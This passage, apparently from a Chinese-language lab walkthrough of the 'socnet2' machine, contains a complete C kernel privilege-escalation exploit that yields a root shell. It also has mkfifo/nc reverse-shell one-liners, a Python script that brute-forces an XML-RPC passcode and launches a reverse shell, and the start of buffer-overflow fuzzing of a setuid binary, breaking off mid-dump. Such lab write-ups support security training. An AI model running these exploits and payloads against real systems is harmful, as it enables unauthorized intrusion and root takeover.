class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">exploit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;rm -rf &#x27;%s/&#x27;&quot;</span>, DIR_BASE);</span><br><span class="line">    system(buf);</span><br><span class="line"></span><br><span class="line">    xmkdir(DIR_BASE, <span class="number">0777</span>);</span><br><span class="line">    xmkdir(DIR_WORK,  <span class="number">0777</span>);</span><br><span class="line">    xmkdir(DIR_LOWER, <span class="number">0777</span>);</span><br><span class="line">    xmkdir(DIR_UPPER, <span class="number">0777</span>);</span><br><span class="line">    xmkdir(DIR_MERGE, <span class="number">0777</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uid_t</span> uid = getuid();</span><br><span class="line">    <span class="keyword">gid_t</span> gid = getgid();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unshare(CLONE_NEWNS | CLONE_NEWUSER) == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;unshare&quot;</span>);</span><br><span class="line"></span><br><span class="line">    xwritefile(<span class="string">&quot;/proc/self/setgroups&quot;</span>, <span class="string">&quot;deny&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;0 %d 1&quot;</span>, uid);</span><br><span class="line">    xwritefile(<span class="string">&quot;/proc/self/uid_map&quot;</span>, buf);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;0 %d 1&quot;</span>, gid);</span><br><span class="line">    xwritefile(<span class="string">&quot;/proc/self/gid_map&quot;</span>, buf);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;lowerdir=%s,upperdir=%s,workdir=%s&quot;</span>, DIR_LOWER, DIR_UPPER, DIR_WORK);</span><br><span class="line">    <span class="keyword">if</span> (mount(<span class="string">&quot;overlay&quot;</span>, DIR_MERGE, <span class="string">&quot;overlay&quot;</span>, <span class="number">0</span>, buf) == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;mount %s&quot;</span>, DIR_MERGE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// all+ep</span></span><br><span class="line">    <span class="keyword">char</span> cap[] = <span class="string">&quot;\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line">    xcopyfile(<span class="string">&quot;/proc/self/exe&quot;</span>, BIN_MERGE, <span class="number">0777</span>);</span><br><span class="line">    <span class="keyword">if</span> (setxattr(BIN_MERGE, <span class="string">&quot;security.capability&quot;</span>, cap, <span class="keyword">sizeof</span>(cap) - <span class="number">1</span>, <span class="number">0</span>) == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;setxattr %s&quot;</span>, BIN_MERGE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(argv[<span class="number">0</span>], <span class="string">&quot;magic&quot;</span>) || (argc &gt; <span class="number">1</span> &amp;&amp; !<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;shell&quot;</span>))) &#123;</span><br><span class="line">        setuid(<span class="number">0</span>);</span><br><span class="line">        setgid(<span class="number">0</span>);</span><br><span class="line">        execl(<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;--norc&quot;</span>, <span class="string">&quot;--noprofile&quot;</span>, <span class="string">&quot;-i&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;execl /bin/bash&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pid_t</span> child = fork();</span><br><span class="line">    <span class="keyword">if</span> (child == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;fork&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (child == <span class="number">0</span>) &#123;</span><br><span class="line">        _exit(exploit());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        waitpid(child, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    execl(BIN_UPPER, BIN_UPPER, <span class="string">&quot;shell&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">&quot;execl %s&quot;</span>, BIN_UPPER);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>上传exploit.c到蚁剑，执行</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line">gcc exploit.c -o exploit</span><br><span class="line">./exploit</span><br><span class="line"></span><br><span class="line"><span class="meta">#发现报错</span></span><br><span class="line"><span class="symbol">bash:</span> cannot <span class="keyword">set</span> terminal process group (<span class="number">1301</span>): Inappropriate ioctl for device</span><br><span class="line"><span class="symbol">bash:</span> no job control <span class="keyword">in</span> this shell</span><br><span class="line">bash<span class="number">-4.4</span><span class="meta"># exit</span></span><br></pre></td></tr></table></figure>

<p>应该是蚁剑的shell问题。</p>
<p>所以我们反弹shell</p>
<h3 id="mkfifo反弹shell"><a href="#mkfifo反弹shell" class="headerlink" title="mkfifo反弹shell"></a>mkfifo反弹shell</h3><p>由于目标机的nc不支持-e参数，所以我们用mkfifo的堆栈操作实现反弹shell</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">rm <span class="regexp">/tmp/</span>f;mkfifo <span class="regexp">/tmp/</span>f;cat <span class="regexp">/tmp/</span>f|<span class="regexp">/bin/</span>bash -i <span class="number">2</span>&gt;&amp;<span class="number">1</span>|nc <span class="number">172.16</span>.<span class="number">42.147</span> <span class="number">4444</span>&gt;<span class="regexp">/tmp/</span>f</span><br></pre></td></tr></table></figure>

<p>kali监听执行</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="comment">#反弹shell监听</span></span><br><span class="line">[root<span class="variable">@kali</span> /tmp]<span class="comment"># nc -lvvp 4444</span></span><br><span class="line">listening on [any] <span class="number">4444</span> ...</span><br><span class="line"><span class="number">172.16</span>.<span class="number">42.205</span>: inverse host lookup <span class="symbol">failed:</span> Host name lookup failure</span><br><span class="line">connect to [<span class="number">172.16</span>.<span class="number">42.147</span>] from (UNKNOWN) [<span class="number">172.16</span>.<span class="number">42.205</span>] <span class="number">35606</span></span><br><span class="line"><span class="symbol">bash:</span> cannot set terminal process group (<span class="number">1301</span>): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line"><span class="symbol">bash:</span> no job control <span class="keyword">in</span> this shell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看当前账号</span></span><br><span class="line">www-data<span class="variable">@socnet2</span><span class="symbol">:/var/www/html/data/images/posts</span><span class="variable">$ </span>whoami</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#python简单升级终端</span></span><br><span class="line">www-data<span class="variable">@socnet2</span><span class="symbol">:/var/www/html/data/images/posts</span><span class="variable">$ </span>python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">&lt;sts<span class="variable">$ </span>python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#漏洞利用</span></span><br><span class="line">www-data<span class="variable">@socnet2</span><span class="symbol">:/var/www/html/data/images/posts</span><span class="variable">$ </span>./exploit</span><br><span class="line">./exploit</span><br><span class="line"><span class="symbol">bash:</span> cannot set terminal process group (<span class="number">1301</span>): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line"><span class="symbol">bash:</span> no job control <span class="keyword">in</span> this shell</span><br><span class="line">bash<span class="number">-4.4</span><span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>成功提权。</p>
<h2 id="提权到socnet账号"><a href="#提权到socnet账号" class="headerlink" title="提权到socnet账号"></a>提权到socnet账号</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>进入socnet账号目录</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">www-data<span class="variable">@socnet2</span><span class="symbol">:/home/socnet</span><span class="variable">$ </span>ls</span><br><span class="line">ls</span><br><span class="line">add_record  monitor.py	peda</span><br></pre></td></tr></table></figure>

<p>查看monitor进程(web应用中管理员有提到该程序)</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">www</span>-data@socnet<span class="number">2</span>:/home/socnet$ ps aux | grep monitor</span><br><span class="line"><span class="attribute">ps</span> aux | grep monitor</span><br><span class="line"><span class="attribute">socnet</span>    <span class="number">1088</span>  <span class="number">0</span>.<span class="number">0</span>  <span class="number">0</span>.<span class="number">0</span>   <span class="number">4628</span>   <span class="number">780</span> ?        Ss   <span class="number">00</span>:<span class="number">56</span>   <span class="number">0</span>:<span class="number">00</span> /bin/sh -c /usr/bin/python /home/socnet/monitor.py</span><br><span class="line"><span class="attribute">socnet</span>    <span class="number">1094</span>  <span class="number">0</span>.<span class="number">0</span>  <span class="number">1</span>.<span class="number">3</span>  <span class="number">42960</span> <span class="number">13252</span> ?        S    <span class="number">00</span>:<span class="number">56</span>   <span class="number">0</span>:<span class="number">02</span> /usr/bin/python /home/socnet/monitor.py</span><br></pre></td></tr></table></figure>



<p>monitor源码</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">www-data<span class="variable">@socnet2</span><span class="symbol">:/home/socnet</span><span class="variable">$ </span>cat monitor.py</span><br><span class="line">cat monitor.py</span><br><span class="line"><span class="comment">#my remote server management API</span></span><br><span class="line">import SimpleXMLRPCServer</span><br><span class="line">import subprocess</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line">debugging_pass = random.randint(<span class="number">1000</span>,<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runcmd</span><span class="params">(cmd)</span></span>:</span><br><span class="line">    results = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)</span><br><span class="line">    output = results.stdout.read() + results.stderr.read()</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cpu</span><span class="params">()</span></span>:</span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;cat /proc/cpuinfo&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mem</span><span class="params">()</span></span>:</span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;free -m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">disk</span><span class="params">()</span></span>:</span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;df -h&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">net</span><span class="params">()</span></span>:</span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;ip a&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secure_cmd</span><span class="params">(cmd,passcode)</span></span>:</span><br><span class="line">    <span class="keyword">if</span> passcode==<span class="symbol">debugging_pass:</span></span><br><span class="line">         <span class="keyword">return</span> runcmd(cmd)</span><br><span class="line">    <span class="symbol">else:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Wrong passcode.&quot;</span></span><br><span class="line"></span><br><span class="line">server = SimpleXMLRPCServer.SimpleXMLRPCServer((<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">8000</span>))</span><br><span class="line">server.register_function(cpu)</span><br><span class="line">server.register_function(mem)</span><br><span class="line">server.register_function(disk)</span><br><span class="line">server.register_function(net)</span><br><span class="line">server.register_function(secure_cmd)</span><br><span class="line"></span><br><span class="line">server.serve_forever()</span><br></pre></td></tr></table></figure>





<h3 id="编写xmlrpc-exploit"><a href="#编写xmlrpc-exploit" class="headerlink" title="编写xmlrpc exploit"></a>编写xmlrpc exploit</h3><p>查询<a href="https://docs.python.org/3/library/xmlrpc.server.html#simplexmlrpcserver-example%E5%AE%98%E6%96%B9client">https://docs.python.org/3/library/xmlrpc.server.html#simplexmlrpcserver-example官方client</a> demo</p>
<ul>
<li>client官方demo</li>
</ul>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">import</span> xmlrpc.client</span><br><span class="line"></span><br><span class="line"><span class="attribute">s</span> = xmlrpc.client.ServerProxy(&#x27;http://localhost:<span class="number">8000</span>&#x27;)</span><br><span class="line"><span class="attribute">print</span>(s.pow(<span class="number">2</span>,<span class="number">3</span>))  # Returns <span class="number">2</span>**<span class="number">3</span> = <span class="number">8</span></span><br><span class="line"><span class="attribute">print</span>(s.add(<span class="number">2</span>,<span class="number">3</span>))  # Returns <span class="number">5</span></span><br><span class="line"><span class="attribute">print</span>(s.mul(<span class="number">5</span>,<span class="number">2</span>))  # Returns <span class="number">5</span>*<span class="number">2</span> = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Print list of available methods</span></span><br><span class="line"><span class="attribute">print</span>(s.system.listMethods())</span><br></pre></td></tr></table></figure>

<p>我们只要实现客户端的xmlrpc，暴力破解debugging_pass，即可利用成功</p>
<p>尝试调用cpu方法。</p>
<ul>
<li>xmlclient.py</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xmlrpc.client</span><br><span class="line"></span><br><span class="line">s = xmlrpc.client.ServerProxy(<span class="string">&#x27;http://172.16.42.205:8000&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s.cpu())  <span class="comment"># Returns 2**3 = 8</span></span><br></pre></td></tr></table></figure>



<figure class="highlight ldif"><table><tr><td class="code"><pre><span class="line">[root@kali /tmp]<span class="comment"># python3 xmlclient.py</span></span><br><span class="line"><span class="attribute">processor	</span>: 0</span><br><span class="line"><span class="attribute">vendor_id	</span>: GenuineIntel</span><br><span class="line"><span class="attribute">cpu family	</span>: 6</span><br><span class="line"><span class="attribute">model		</span>: 126</span><br><span class="line"><span class="attribute">model name	</span>: Intel(R) Core(TM) i5-1038NG7 CPU @ 2.00GHz</span><br><span class="line"><span class="attribute">stepping	</span>: 5</span><br><span class="line"><span class="attribute">cpu MHz		</span>: 1996.800</span><br><span class="line"><span class="attribute">cache size	</span>: 6144 KB</span><br></pre></td></tr></table></figure>



<p>执行成功。</p>
<h3 id="爆破密码"><a href="#爆破密码" class="headerlink" title="爆破密码"></a>爆破密码</h3><figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line">import xmlrpc.<span class="keyword">client</span></span><br><span class="line"></span><br><span class="line">s = xmlrpc.<span class="keyword">client</span>.ServerProxy(<span class="string">&#x27;http://172.16.42.205:8000&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> range(<span class="number">1000</span>,<span class="number">10000</span>):</span><br><span class="line">	result = <span class="built_in">str</span>(s.secure_cmd(<span class="string">&#x27;id&#x27;</span>, p))</span><br><span class="line">	<span class="keyword">if</span> not <span class="string">&quot;Wrong&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">		<span class="keyword">print</span>(p)</span><br><span class="line">		<span class="keyword">print</span>(result)</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>执行成功</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">[root@kali /tmp]# python3 xmlclient.py</span><br><span class="line">3599</span><br><span class="line"><span class="attribute">uid</span>=1000(socnet) <span class="attribute">gid</span>=1000(socnet) <span class="attribute">groups</span>=1000(socnet),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)</span><br></pre></td></tr></table></figure>



<h3 id="反弹脚本"><a href="#反弹脚本" class="headerlink" title="反弹脚本"></a>反弹脚本</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">import xmlrpc<span class="selector-class">.client</span></span><br><span class="line"></span><br><span class="line">s = xmlrpc<span class="selector-class">.client</span><span class="selector-class">.ServerProxy</span>(<span class="string">&#x27;http://172.16.42.205:8000&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 172.16.42.147 5555&gt;/tmp/f&quot;</span></span><br><span class="line">result = str(s<span class="selector-class">.secure_cmd</span>(cmd, <span class="number">3599</span>))</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(str(result)</span></span>)</span><br></pre></td></tr></table></figure>

<p>执行，收到反弹的shell</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">[root@kali /tmp]<span class="comment"># python3 xmlclient.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#监听收到了socnet账号的shell</span></span><br><span class="line">[root@kali ~]<span class="comment"># nc -lvvp 5555</span></span><br><span class="line">listening <span class="literal">on</span> [any] <span class="number">5555</span> ...</span><br><span class="line"><span class="number">172.16</span>.<span class="number">42.205</span>: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect <span class="keyword">to</span> [<span class="number">172.16</span>.<span class="number">42.147</span>] <span class="keyword">from</span> (UNKNOWN) [<span class="number">172.16</span>.<span class="number">42.205</span>] <span class="number">38896</span></span><br><span class="line">bash: cannot set terminal process group (<span class="number">1088</span>): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: <span class="literal">no</span> job control <span class="keyword">in</span> <span class="built_in">this</span> shell</span><br><span class="line">socnet@socnet2:~$</span><br></pre></td></tr></table></figure>



<h3 id="python升级shell"><a href="#python升级shell" class="headerlink" title="python升级shell"></a>python升级shell</h3><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>







<h2 id="使用GDB进行缓存区溢出漏洞挖掘"><a href="#使用GDB进行缓存区溢出漏洞挖掘" class="headerlink" title="使用GDB进行缓存区溢出漏洞挖掘"></a>使用GDB进行缓存区溢出漏洞挖掘</h2><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>查看add_record的文件头</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">socnet</span>@socnet<span class="number">2</span>:~$ file add_record</span><br><span class="line"><span class="attribute">file</span> add_record</span><br><span class="line"><span class="attribute">add_record</span>: setuid, setgid ELF <span class="number">32</span>-bit LSB executable, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib/ld-linux.so.<span class="number">2</span>, for GNU/Linux <span class="number">3</span>.<span class="number">2</span>.<span class="number">0</span>, BuildID[sha<span class="number">1</span>]=e<span class="number">3</span>fa<span class="number">9</span>a<span class="number">66</span>b<span class="number">0</span>b<span class="number">1</span>e<span class="number">3281</span>ae<span class="number">09</span>b<span class="number">3</span>fb<span class="number">1</span>b<span class="number">7</span>b<span class="number">82</span>ff<span class="number">17972</span>d<span class="number">8</span>, not strippe</span><br></pre></td></tr></table></figure>

<p>查看文件权限</p>
<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">socnet@socnet2:~$ ls -l</span><br><span class="line">ls -l</span><br><span class="line">total 16</span><br><span class="line">-rwsrwsr-x<span class="number"> 1 </span>root   socnet<span class="number"> 6952 </span>Oct<span class="number"> 29 </span><span class="number"> 2018 </span>add_record</span><br><span class="line">-rw-rw-r--<span class="number"> 1 </span>socnet socnet <span class="number"> 904 </span>Oct<span class="number"> 29 </span><span class="number"> 2018 </span>monitor.py</span><br><span class="line">drwxrwxr-x<span class="number"> 4 </span>socnet socnet<span class="number"> 4096 </span>Oct<span class="number"> 29 </span><span class="number"> 2018 </span>ped</span><br></pre></td></tr></table></figure>

<p>可以确定add_record开启了suid权限。文件权限为root。</p>
<p>PEDA - Python Exploit Development Assistance for GDB。peda是用来辅助gdb调试的python脚本。</p>
<h3 id="gdb调试进行缓冲区溢出漏洞挖掘"><a href="#gdb调试进行缓冲区溢出漏洞挖掘" class="headerlink" title="gdb调试进行缓冲区溢出漏洞挖掘"></a>gdb调试进行缓冲区溢出漏洞挖掘</h3><p>安静模式启动gdb</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">gdb -<span class="selector-tag">q</span> ./add_record</span><br></pre></td></tr></table></figure>

<p>执行<code>r</code>，程序加载执行</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">gdb<span class="literal">-peda</span><span class="variable">$</span> <span class="built_in">r</span></span><br></pre></td></tr></table></figure>

<p>另启一个终端，打印500个字符A</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[root<span class="symbol">@kali</span> ~]<span class="meta"># python -c <span class="string">&quot;print(&#x27;A&#x27;*500)&quot;</span></span></span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure>

<p>复制A字符串，查看<code>Employee Name(char)</code>是否存在缓冲区溢出</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">gdb-peda$ r</span><br><span class="line">r</span><br><span class="line">Starting program: /home/socnet/add_record</span><br><span class="line">Welcome <span class="keyword">to</span> <span class="keyword">Add</span> <span class="type">Record</span> application</span><br><span class="line">Use it <span class="keyword">to</span> <span class="keyword">add</span> <span class="keyword">info</span> about Social Network <span class="number">2.0</span> Employees</span><br><span class="line">Employee <span class="type">Name</span>(<span class="type">char</spanspan><br><span class="linespan><br><span class="line">Years worked(<span class="type">int</span>): Salary(<span class="type">int</span>): Ever got <span class="keyword">in</span> trouble? <span class="number">1</span> (yes) <span class="keyword">or</span> <span class="number">0</span> (<span class="keyword">no</span>): Employee data you<span class="string">&#x27;ve entered:</span></span><br><span class="line"><span class="string">Name AAAAAAAAAAAAAAAAAAAAAAAA</span></span><br><span class="line"><span class="string">Years -136196023, Salary -8493, Trouble 8, Comments NA</span></span><br><span class="line"><span class="string">[Inferior 1 (process 17994) exited normally]</span></span><br><span class="line"><span class="string">Warning: not running or target is remot</span></span><br></pre></td></tr></table></figure>

<p>直接退出了，正常退出，所以应该不存在溢出漏洞。</p>
<p>测试<code>Years worked(int)</code>也不存在</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">gdb-peda$ r</span><br><span class="line">r</span><br><span class="line">Starting program: /home/socnet/add_record</span><br><span class="line">Welcome <span class="keyword">to</span> <span class="keyword">Add</span> <span class="type">Record</span> application</span><br><span class="line">Use it <span class="keyword">to</span> <span class="keyword">add</span> <span class="keyword">info</span> about Social Network <span class="number">2.0</span> Employees</span><br><span class="line">Employee <span class="type">Name</span>(<span class="type">char</span>): a</span><br><span class="line">a</span><br><span class="line">Years worked(<span class="type">int</spanspan><br><span class="linespan><br><span class="line">Salary(<span class="type">int</span>): Ever got <span class="keyword">in</span> trouble? <span class="number">1</span> (yes) <span class="keyword">or</span> <span class="number">0</span> (<span class="keyword">no</span>): Employee data you<span class="string">&#x27;ve entered:</span></span><br><span class="line"><span class="string">Name a</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Years -136196023, Salary -8493, Trouble 8, Comments NA</span></span><br><span class="line"><span class="string">[Inferior 1 (process 18105) exited normally]</span></span><br><span class="line"><span class="string">Warning: not running or target is remote</span></span><br></pre></td></tr></table></figure>



<p>继续测试，发现Explain存在内存溢出</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">gdb</span>-peda$ r</span><br><span class="line"><span class="attribute">r</span></span><br><span class="line"><span class="attribute">Starting</span> program: /home/socnet/add_record</span><br><span class="line"><span class="attribute">Welcome</span> to Add Record application</span><br><span class="line"><span class="attribute">Use</span> it to add info about Social Network <span class="number">2</span>.<span class="number">0</span> Employees</span><br><span class="line"><span class="attribute">Employee</span> Name(char): a</span><br><span class="line"><span class="attribute">a</span></span><br><span class="line"><span class="attribute">Years</span> worked(int): <span class="number">1</span></span><br><span class="line"><span class="attribute">1</span></span><br><span class="line"><span class="attribute">Salary</span>(int): <span class="number">1</span></span><br><span class="line"><span class="attribute">1</span></span><br><span class="line"><span class="attribute">Ever</span> got in trouble? <span class="number">1</span> (yes) or <span class="number">0</span> (no): <span class="number">1</span></span><br><span class="line"><span class="attribute">1</span></span><br><span class="line"><span class="attribute">Explain</span>: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line"><span class="attribute">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">Program</span> received signal SIGSEGV, Segmentation fault.<span class="meta"></span></span><br><span class="line"><span class="meta">[----------------------------------registers-----------------------------------]</span></span><br><span class="line"><span class="attribute">EAX</span>: <span class="number">0</span>xffffdc<span class="number">0</span>e (&#x27;A&#x27; &lt;repeats <span class="number">200</span> times&gt;...)</span><br><span class="line"><span class="attribute">EBX</span>: <span class="number">0</span>x<span class="number">41414141</span> (&#x27;AAAA&#x27;)</span><br><span class="line"><span class="attribute">ECX</span>: <span class="number">0</span>xffffde<span class="number">60</span> --&gt; <span class="number">0</span>x<span class="number">0</span></span><br><span class="line"><span class="attribute">EDX</span>: <span class="number">0</span>xffffde<span class="number">02</span> --&gt; <span class="number">0</span>x<span class="number">41414100</span> (&#x27;&#x27;)</span><br><span class="line"><span class="attribute">ESI</span>: <span class="number">0</span>xf<span class="number">7</span>fc<span class="number">2000</span> --&gt; <span class="number">0</span>x<span class="number">1</span>d<span class="number">4</span>d<span class="number">6</span>c</span><br><span class="line"><span class="attribute">EDI</span>: <span class="number">0</span>xffffdcd<span class="number">0</span> (&#x27;A&#x27; &lt;repeats <span class="number">200</span> times&gt;...)</span><br><span class="line"><span class="attribute">EBP</span>: <span class="number">0</span>x<span class="number">41414141</span> (&#x27;AAAA&#x27;)</span><br><span class="line"><span class="attribute">ESP</span>: <span class="number">0</span>xffffdc<span class="number">50</span> 